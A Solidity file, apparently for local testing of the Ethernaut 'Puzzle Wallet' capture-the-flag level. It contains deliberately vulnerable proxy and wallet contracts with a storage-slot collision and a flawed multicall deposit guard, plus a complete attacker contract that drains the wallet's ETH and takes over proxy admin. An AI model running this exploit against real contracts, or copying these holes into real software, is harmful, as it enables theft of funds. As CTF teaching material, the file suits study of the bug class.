// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// ──────────────────────────────────────────────────────────────────────────────
//  Ethernaut Level 24 — Puzzle Wallet
//
//  VULNERABILITY: Storage collision between proxy admin slot and wallet owner
//  slot, combined with multicall allowing nested depositETH calls that inflate
//  the internal balance tracking without depositing extra ETH.
//
//  CONTEXT:
//  • PuzzleProxy: slot 0 = pendingAdmin, slot 1 = admin
//  • PuzzleWallet: slot 0 = owner, slot 1 = maxBalance
//  Because they share storage, proxy.pendingAdmin == wallet.owner and
//  proxy.admin == wallet.maxBalance.
//
//  EXPLOIT STEPS:
//  1. Call proxy.proposeNewAdmin(attacker):
//       Sets pendingAdmin = attacker → ALSO sets wallet.owner = attacker
//       (storage collision, slot 0).
//  2. wallet.addToWhitelist(attacker): now attacker can call wallet functions.
//  3. Craft multicall payload:
//       • Inner call A = abi.encodeCall(depositETH, ())
//       • Inner call B = multicall([A])  ← nested multicall re-uses msg.value
//       • Outer call  = multicall([A, B])
//       Send 0.001 ETH. Contract records balances[attacker] += 0.001 (from A)
//       then multicall(B) runs depositETH again from *within* multicall, bypassing
//       the depositCalled guard (it's reset per multicall frame) → records
//       another +0.001. Now balances[attacker] == 0.002 while contract only holds 0.001.
//  4. wallet.execute(attacker, contractBalance, ""): drain entire ETH balance.
//  5. wallet.setMaxBalance(uint(uint160(attacker))):
//       Sets maxBalance = attacker address → ALSO sets proxy.admin = attacker
//       (storage collision, slot 1). Admin is now the attacker.
//
//  ROOT CAUSE:
//  • Proxy and implementation share storage but have different layouts → collisions.
//  • multicall does not properly prevent re-use of msg.value across nested calls.
// ──────────────────────────────────────────────────────────────────────────────

/// @title IPuzzleWallet
/// @notice Interface for interacting with PuzzleWallet through the proxy
interface IPuzzleWallet {
    function admin() external view returns (address);
    function proposeNewAdmin(address _newAdmin) external;
    function approveNewAdmin(address _expectedAdmin) external;
    function upgradeTo(address _newImplementation) external;
    function init(uint256 _maxBalance) external;
    function setMaxBalance(uint256 _maxBalance) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function multicall(bytes[] calldata data) external payable;
    function whitelisted(address) external view returns (bool);
    function balances(address) external view returns (uint256);
    function owner() external view returns (address);
    function maxBalance() external view returns (uint256);
}

// ──────────────────────────────────────────────────────────────────────────────
//  Minimal proxy implementation for local testing
// ──────────────────────────────────────────────────────────────────────────────

/// @title PuzzleProxy
/// @notice Minimal upgradeable proxy with admin management
/// @dev Storage layout: slot 0 = pendingAdmin, slot 1 = admin, slot 2 = implementation.
///      VULNERABILITY: slot 0 and slot 1 collide with PuzzleWallet's owner and maxBalance.
contract PuzzleProxy {
    /// @notice Pending admin awaiting approval (slot 0 — collides with PuzzleWallet.owner)
    address public pendingAdmin;
    /// @notice Current proxy admin (slot 1 — collides with PuzzleWallet.maxBalance)
    address public admin;

    /// @dev Address of the current implementation contract
    address internal implementation;

    /// @notice Deploy the proxy with admin, implementation, and initialization data
    /// @param _admin Initial admin address
    /// @param _implementation Address of the logic/implementation contract
    /// @param _initData ABI-encoded call to the initialization function
    /// @dev Constructor is payable to allow seeding ETH, but init must be called
    ///      without value (non-payable). ETH should be sent separately after deploy.
    constructor(address _admin, address _implementation, bytes memory _initData) payable {
        implementation = _implementation;
        (bool ok,) = _implementation.delegatecall(_initData);
        require(ok, "PuzzleProxy: init failed");
        admin = _admin;
    }

    /// @notice Propose a new admin (VULNERABILITY: overwrites wallet.owner via slot 0)
    /// @param _newAdmin Address to propose as new admin
    /// @dev Anyone can call this — no access control. This is intentional for the CTF.
    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    /// @notice Approve a pending admin change
    /// @param _expectedAdmin Address that should match pendingAdmin
    /// @dev Only current admin can approve
    function approveNewAdmin(address _expectedAdmin) external {
        require(msg.sender == admin, "PuzzleProxy: not admin");
        require(pendingAdmin == _expectedAdmin, "PuzzleProxy: not pending admin");
        admin = pendingAdmin;
    }

    /// @notice Upgrade to a new implementation
    /// @param _newImplementation Address of the new logic contract
    /// @dev Only admin can upgrade
    function upgradeTo(address _newImplementation) external {
        require(msg.sender == admin, "PuzzleProxy: not admin");
        implementation = _newImplementation;
    }

    /// @notice Fallback: delegates all calls to the implementation via delegatecall
    /// @dev Uses assembly for gas-efficient forwarding of calldata and returndata
    fallback() external payable {
        address impl = implementation;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    /// @notice Receive ETH without calldata
    receive() external payable {}
}

/// @title PuzzleWallet
/// @notice Implementation contract with deposit/execute/multicall logic
/// @dev Storage layout: slot 0 = owner, slot 1 = maxBalance.
///      VULNERABILITY: These collide with PuzzleProxy's pendingAdmin and admin slots.
///      The multicall function has a flawed depositCalled guard that can be bypassed
///      with nested multicall calls to inflate balance accounting.
contract PuzzleWallet {
    /// @notice Owner of the wallet (slot 0 — collides with PuzzleProxy.pendingAdmin)
    address public owner;
    /// @notice Maximum allowed ETH balance (slot 1 — collides with PuzzleProxy.admin)
    uint256 public maxBalance;

    /// @notice Whitelist of addresses allowed to call protected functions
    mapping(address => bool) public whitelisted;
    /// @notice Internal balance tracking per address
    mapping(address => uint256) public balances;

    /// @notice Initialize the wallet with a max balance cap
    /// @param _maxBalance Maximum ETH the contract should hold
    /// @dev Can only be called once (when maxBalance is 0). Sets owner to msg.sender.
    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "PuzzleWallet: already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    /// @dev Restricts access to whitelisted addresses
    modifier onlyWhitelisted() {
        require(whitelisted[msg.sender], "PuzzleWallet: not whitelisted");
        _;
    }

    /// @notice Set a new max balance (only when contract holds no ETH)
    /// @param _maxBalance New maximum balance value
    /// @dev VULNERABILITY: Writing to maxBalance (slot 1) also writes to proxy.admin
    ///      due to storage collision. If contract balance is 0, attacker can set
    ///      proxy admin to any address.
    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        require(address(this).balance == 0, "PuzzleWallet: contract has balance");
        maxBalance = _maxBalance;
    }

    /// @notice Add an address to the whitelist
    /// @param addr Address to whitelist
    /// @dev Only owner can whitelist. Since owner collides with pendingAdmin,
    ///      anyone who calls proposeNewAdmin becomes the owner.
    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "PuzzleWallet: not owner");
        whitelisted[addr] = true;
    }

    /// @notice Deposit ETH into the wallet
    /// @dev Tracks deposits per sender in the balances mapping.
    ///      Checks that total balance doesn't exceed maxBalance.
    function deposit() external payable onlyWhitelisted {
        require(address(this).balance <= maxBalance, "PuzzleWallet: max balance reached");
        balances[msg.sender] += msg.value;
    }

    /// @notice Execute an arbitrary call with ETH from the sender's balance
    /// @param to Target address for the call
    /// @param value Amount of ETH to send
    /// @param data Calldata for the external call
    /// @dev Deducts value from sender's tracked balance before making the call
    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "PuzzleWallet: insufficient balance");
        balances[msg.sender] -= value;
        (bool ok,) = to.call{value: value}(data);
        require(ok, "PuzzleWallet: call failed");
    }

    /// @notice Execute multiple calls in a single transaction
    /// @param data Array of ABI-encoded function calls to execute
    /// @dev VULNERABILITY: The depositCalled guard only prevents direct double-deposit
    ///      within one multicall frame. A nested multicall([deposit]) resets the guard,
    ///      allowing msg.value to be credited multiple times without additional ETH.
    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes4 selector = bytes4(data[i][:4]);
            if (selector == this.deposit.selector) {
                require(!depositCalled, "PuzzleWallet: no double deposit");
                depositCalled = true;
            }
            (bool ok,) = address(this).delegatecall(data[i]);
            require(ok, "PuzzleWallet: multicall failed");
        }
    }
}

// ──────────────────────────────────────────────────────────────────────────────
//  Attacker contract — orchestrates all steps automatically
// ──────────────────────────────────────────────────────────────────────────────

/// @title PuzzleWalletAttacker
/// @notice Exploits storage collision + nested multicall to drain ETH and become admin
/// @dev Executes the full 5-step exploit in a single transaction
contract PuzzleWalletAttacker {
    /// @notice Reference to the proxy contract
    PuzzleProxy public proxy;
    /// @notice Interface to interact with wallet functions through the proxy
    IPuzzleWallet public wallet;

    /// @notice Deploy attacker targeting a specific proxy
    /// @param _proxy Address of the PuzzleProxy (payable)
    constructor(address payable _proxy) {
        proxy = PuzzleProxy(_proxy);
        wallet = IPuzzleWallet(_proxy);
    }

    /// @notice Execute the full exploit — send ETH equal to the contract's current balance
    /// @dev Steps:
    ///      1. proposeNewAdmin → become wallet owner (slot 0 collision)
    ///      2. addToWhitelist(self) → gain access to protected functions
    ///      3. Nested multicall with deposit → inflate balance tracking (msg.value reuse)
    ///      4. execute → drain all ETH from the contract
    ///      5. setMaxBalance(msg.sender) → become proxy admin (slot 1 collision)
    function attack() external payable {
        // Step 1: Storage collision → become wallet owner
        proxy.proposeNewAdmin(address(this));

        // Step 2: Whitelist ourselves
        wallet.addToWhitelist(address(this));

        // Step 3: Inflate balance via nested multicall
        bytes[] memory innerData = new bytes[](1);
        innerData[0] = abi.encodeWithSelector(wallet.deposit.selector);

        bytes[] memory outerData = new bytes[](2);
        outerData[0] = abi.encodeWithSelector(wallet.deposit.selector);
        outerData[1] = abi.encodeWithSelector(wallet.multicall.selector, innerData);

        wallet.multicall{value: msg.value}(outerData);

        // Step 4: Drain full contract balance
        uint256 contractBal = address(proxy).balance;
        wallet.execute(address(this), contractBal, "");

        // Step 5: Storage collision → become proxy admin
        wallet.setMaxBalance(uint256(uint160(msg.sender)));
    }

    /// @notice Receive ETH from the drained contract
    receive() external payable {}
}
